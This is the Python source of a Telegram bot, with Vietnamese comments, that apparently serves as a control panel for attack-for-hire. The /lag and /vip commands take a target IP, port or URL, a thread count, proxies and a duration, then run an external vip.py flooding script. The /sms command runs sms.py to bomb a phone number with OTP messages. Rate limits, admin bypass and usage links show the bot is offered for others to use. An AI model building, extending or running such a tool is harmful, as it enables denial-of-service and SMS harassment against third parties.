from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from dotenv import load_dotenv
import subprocess
import shlex
import os
import time
import logging

# Load biến môi trường từ file .env
load_dotenv()

# Lấy token bot và ID nhóm từ biến môi trường
BOT_TOKEN = os.getenv("BOT_TOKEN")
GROUP_ID = os.getenv("GROUP_ID")

# Kiểm tra xem các biến môi trường có tồn tại không
if BOT_TOKEN is None:
    raise ValueError("❌ BOT_TOKEN không được tìm thấy trong file .env. Vui lòng kiểm tra lại.")
if GROUP_ID is None:
    raise ValueError("❌ GROUP_ID không được tìm thấy trong file .env. Vui lòng kiểm tra lại.")

# Chuyển đổi GROUP_ID thành số nguyên
GROUP_ID = int(GROUP_ID)

# Cấu hình logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Hàm kiểm tra rate limiting
def check_rate_limit(context: CallbackContext, user_id: int, is_admin: bool) -> bool:
    # Nếu là admin, không cần kiểm tra rate limit
    if is_admin:
        return True

    current_time = time.time()
    last_command_time = context.user_data.get(user_id, {}).get("last_command_time", 0)

    # Kiểm tra xem đã đủ 60 giây chưa
    if current_time - last_command_time < 60:
        return False  # Chưa đủ thời gian
    return True  # Đủ thời gian

# Cập nhật thời gian cuối cùng người dùng gửi lệnh
def update_rate_limit(context: CallbackContext, user_id: int):
    context.user_data[user_id] = {"last_command_time": time.time()}

# Hàm kiểm tra xem người dùng có phải là admin không
async def is_admin(update: Update, context: CallbackContext) -> bool:
    user = update.effective_user
    chat = update.effective_chat
    admins = await chat.get_administrators()
    return user.id in [admin.user.id for admin in admins]

# Lệnh /lag để gọi vip.py
async def lag(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    is_admin_user = await is_admin(update, context)

    # Kiểm tra rate limiting (trừ admin)
    if not check_rate_limit(context, user_id, is_admin_user):
        await update.message.reply_text("⏳ Bạn cần chờ 60 giây trước khi sử dụng lại lệnh này.")
        return

    if len(context.args) != 4:
        await update.message.reply_text("Sai cú pháp! Dùng: /lag <phương thức> <ip:port> <luồng> <thời lượng>")
        return

    method, target, threads, duration = context.args

    # Tách IP và Port từ target
    if ":" in target:
        target_ip, target_port = target.split(":")
    else:
        target_ip = target
        target_port = "80"  # Port mặc định nếu không được cung cấp

    # Tạo thông báo chi tiết
    message = (
        "🚀 Attack started.\n"
        f"Target IP: `{target_ip}`\n"
        f"Port: `{target_port}`\n"
        f"Duration: `{duration}` seconds\n"
        f"Active Attacks: `1`"
    )

    await update.message.reply_text(message, parse_mode="Markdown")

    # Tạo lệnh để chạy vip.py
    command = f"python3 vip.py {shlex.quote(method)} {shlex.quote(target)} {shlex.quote(threads)} {shlex.quote(duration)}"
    logger.debug(f"Running command: {command}")

    try:
        # Chạy vip.py
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        logger.debug(f"stdout: {stdout.decode()}")
        logger.error(f"stderr: {stderr.decode()}")
        context.chat_data["attack_process"] = process  # Lưu process để dừng sau này
        logger.debug("vip.py started successfully")
    except Exception as e:
        logger.error(f"Error running vip.py: {e}")
        await update.message.reply_text(f"❌ Lỗi khi chạy lệnh: {e}")

    # Cập nhật thời gian cuối cùng người dùng gửi lệnh (trừ admin)
    if not is_admin_user:
        update_rate_limit(context, user_id)

# Lệnh /vip để điều khiển tấn công chi tiết
async def vip(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    is_admin_user = await is_admin(update, context)

    # Kiểm tra rate limiting (trừ admin)
    if not check_rate_limit(context, user_id, is_admin_user):
        await update.message.reply_text("⏳ Bạn cần chờ 60 giây trước khi sử dụng lại lệnh này.")
        return

    if len(context.args) != 7:
        await update.message.reply_text("Sai cú pháp! Dùng: /vip <phương thức> <url> <kiểu vớ> <luồng> <danh sách proxy> <rpc> <thời lượng>")
        return

    method, url, sock_type, threads, proxy_list, rpc, duration = context.args

    # Tạo thông báo chi tiết
    message = (
        "🚀 Attack started.\n"
        f"Target IP: `{url}`\n"
        f"Port: `80`\n"  # Port mặc định, bạn có thể điều chỉnh nếu cần
        f"Duration: `{duration}` seconds\n"
        f"Active Attacks: `1`"
    )

    await update.message.reply_text(message, parse_mode="Markdown")

    # Tạo lệnh để chạy vip.py
    command = f"python3 vip.py {shlex.quote(method)} {shlex.quote(url)} {shlex.quote(sock_type)} {shlex.quote(threads)} {shlex.quote(proxy_list)} {shlex.quote(rpc)} {shlex.quote(duration)}"
    logger.debug(f"Running command: {command}")

    try:
        # Chạy vip.py
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        logger.debug(f"stdout: {stdout.decode()}")
        logger.error(f"stderr: {stderr.decode()}")
        context.chat_data["vip_process"] = process  # Lưu process để dừng sau này
        logger.debug("vip.py started successfully")
    except Exception as e:
        logger.error(f"Error running vip.py: {e}")
        await update.message.reply_text(f"❌ Lỗi khi chạy lệnh VIP: {e}")

    # Cập nhật thời gian cuối cùng người dùng gửi lệnh (trừ admin)
    if not is_admin_user:
        update_rate_limit(context, user_id)

# Lệnh /stop để dừng tấn công
async def stop(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    is_admin_user = await is_admin(update, context)

    # Kiểm tra rate limiting (trừ admin)
    if not check_rate_limit(context, user_id, is_admin_user):
        await update.message.reply_text("⏳ Bạn cần chờ 60 giây trước khi sử dụng lại lệnh này.")
        return

    process = context.chat_data.get("attack_process")
    if process:
        process.terminate()
        await update.message.reply_text("🛑 Đã dừng tấn công.")
    else:
        await update.message.reply_text("⚠️ Không có cuộc tấn công nào đang chạy.")

    # Cập nhật thời gian cuối cùng người dùng gửi lệnh (trừ admin)
    if not is_admin_user:
        update_rate_limit(context, user_id)

# Lệnh /sms để gọi sms.py
async def sms(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    is_admin_user = await is_admin(update, context)

    # Kiểm tra rate limiting (trừ admin)
    if not check_rate_limit(context, user_id, is_admin_user):
        await update.message.reply_text("⏳ Bạn cần chờ 60 giây trước khi sử dụng lại lệnh này.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Sai cú pháp! Dùng: /sms <số điện thoại> <số giây>")
        return

    phone_number, delay = context.args

    # Tạo thông báo chi tiết
    message = (
        "📱 Đang Tấn Công 🤖...\n"
        f"Số điện thoại: `{phone_number}`\n"
        f"Độ trễ: `{delay}` giây"
    )

    await update.message.reply_text(message, parse_mode="Markdown")

    # Tạo lệnh để chạy sms.py
    command = f"python3 sms.py {shlex.quote(phone_number)} {shlex.quote(delay)}"
    logger.debug(f"Running command: {command}")

    try:
        # Chạy sms.py
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        logger.debug(f"stdout: {stdout.decode()}")
        logger.error(f"stderr: {stderr.decode()}")
        context.chat_data["sms_process"] = process  # Lưu process để dừng sau này
        logger.debug("sms.py started successfully")
        await update.message.reply_text("✅ Đã Tấn Công Sms!")
    except Exception as e:
        logger.error(f"Error running sms.py: {e}")
        await update.message.reply_text(f"❌ Lỗi khi chạy lệnh SMS: {e}")

    # Cập nhật thời gian cuối cùng người dùng gửi lệnh (trừ admin)
    if not is_admin_user:
        update_rate_limit(context, user_id)

# Lệnh /help để hiển thị danh sách lệnh
async def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    is_admin_user = await is_admin(update, context)

    # Kiểm tra rate limiting (trừ admin)
    if not check_rate_limit(context, user_id, is_admin_user):
        await update.message.reply_text("⏳ Bạn cần chờ 60 giây trước khi sử dụng lại lệnh này.")
        return

    help_text = """
    📖 Danh sách lệnh:
    - /lag <phương thức> <ip:port> <luồng> <thời lượng>: Bắt đầu tấn công.
    - /stop: Dừng tấn công.
    - /vip <phương thức> <url> <kiểu vớ> <luồng> <danh sách proxy> <rpc> <thời lượng>: Điều khiển tấn công chi tiết.
    - /sms <số điện thoại> <số giây>: Gửi OTP đến số điện thoại.
    -Cách Sửa Dụng Trên Ios:https://t.me/aniosvip/143/385
    -Cách sửa Dụng Trên Adr:https://t.me/aniosvip/1/390
    """
    await update.message.reply_text(help_text)

    # Cập nhật thời gian cuối cùng người dùng gửi lệnh (trừ admin)
    if not is_admin_user:
        update_rate_limit(context, user_id)

# Lệnh /ban để cấm người dùng khỏi nhóm (chỉ admin)
async def ban(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    chat = update.effective_chat

    # Kiểm tra xem người dùng có phải là admin không
    if user.id not in [admin.user.id for admin in await chat.get_administrators()]:
        await update.message.reply_text("⚠️ Chỉ admin mới có thể sử dụng lệnh này.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Sai cú pháp! Dùng: /ban @username")
        return

    username = context.args[0]
    await chat.ban_member(username)
    await update.message.reply_text(f"🚫 Đã cấm người dùng {username} khỏi nhóm.")

# Lệnh /block để cấm người dùng chat trong nhóm (chỉ admin)
async def block(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    chat = update.effective_chat

    # Kiểm tra xem người dùng có phải là admin không
    if user.id not in [admin.user.id for admin in await chat.get_administrators()]:
        await update.message.reply_text("⚠️ Chỉ admin mới có thể sử dụng lệnh này.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Sai cú pháp! Dùng: /block @username")
        return

    username = context.args[0]
    await chat.restrict_member(username, can_send_messages=False)
    await update.message.reply_text(f"🚫 Đã cấm người dùng {username} chat trong nhóm.")

# Hàm gửi thông báo khi bot khởi động
async def on_startup(app: Application):
    bot = app.bot
    await bot.send_message(chat_id=GROUP_ID, text="🤖 Bot đã được mở!")

# Hàm gửi thông báo khi bot tắt
async def on_shutdown(app: Application):
    bot = app.bot
    await bot.send_message(chat_id=GROUP_ID, text="🤖 Bot Đã Đóng!")

# Khởi chạy bot
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).post_stop(on_shutdown).build()
    
    # Thêm các command handlers
    app.add_handler(CommandHandler("lag", lag))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("block", block))
    app.add_handler(CommandHandler("vip", vip))
    app.add_handler(CommandHandler("sms", sms))  # Thêm lệnh /sms

    # Đăng ký sự kiện startup và shutdown
    print("🤖 Bot đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()